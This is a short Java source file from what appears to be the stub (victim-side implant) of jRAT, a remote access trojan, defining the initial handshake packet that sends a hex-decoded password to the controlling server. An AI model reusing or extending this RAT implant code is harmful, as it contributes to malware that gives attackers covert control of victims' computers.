package su.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import su.jrat.common.codec.Hex;
import su.jrat.common.io.StringWriter;
import su.jrat.stub.Main;

public class Packet1InitHandshake extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {		
		String data = Main.getPass();
				
		dos.write(Hex.decodeToBytes(data));
	}

	@Override
	public byte getPacketId() {
		return (byte) 1;
	}

}
